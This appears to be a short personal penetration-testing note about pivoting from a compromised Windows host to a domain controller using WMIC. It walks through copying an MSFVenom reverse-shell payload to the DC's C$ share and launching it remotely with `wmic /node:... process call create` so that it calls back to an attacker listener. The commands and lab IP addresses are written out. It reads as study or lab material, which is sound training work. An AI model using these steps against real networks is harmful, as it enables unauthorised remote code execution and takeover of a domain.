The Windows Management Instrumentation Command line (WMIC) is **a software utility that allows users to performs Windows Management Instrumentation (WMI) operations with a command prompt.**
	Essentially allows us to execute remote operations or commands through WMI if we upload malicious payloads to a different machine.

As an example to setup:

Attacker Machine (Through VPN) - 10.0.30.67/24
Victim Machine - 10.0.30.7/24 (Also has another Ethernet adapter to 10.0.10.0/24)
Goal Machine - 10.0.10.89/24 - DOMAIN CONTROLLER

We gain RCE to the Victim machine through some sort of exploit

* Goal is to pivot from the Victim machine to the DC
* This pivoting technique REQUIRES you to know the IP address of the DC

Generate an executable .exe through MSFVenom, a reverse shell or something
	Just anything to call back to a listener on the Attacker Machine

* Upload the listener to the Victim machine via a simple python server, or through meterpreter (really anything that'll get the MSFVenom payload to the Victim machine

On the Victim Machine
`copy setup.exe \\DC$IP\c$`
Confirm that this is on the DC by running
`dir \\DC$IP\c$`

* The problem that we encounter is that we now need to execute the payload itself on the DC, but we can't do that through normal means
* However, we can use WMIC to remotely execute this command on the DC from the Victim machine.*

Command Syntax - Victim Machine
`wmic /node:"<target>" process call create "\\<target>\<payload>"`
`wmic /node:"10.0.10.89" process call create "\\10.0.10.89\setup.exe"`

* Once this is executed, the payload should call back to our listener on our Attacking Machine
* We should gain a shell on the DC and have successfully pivoted.*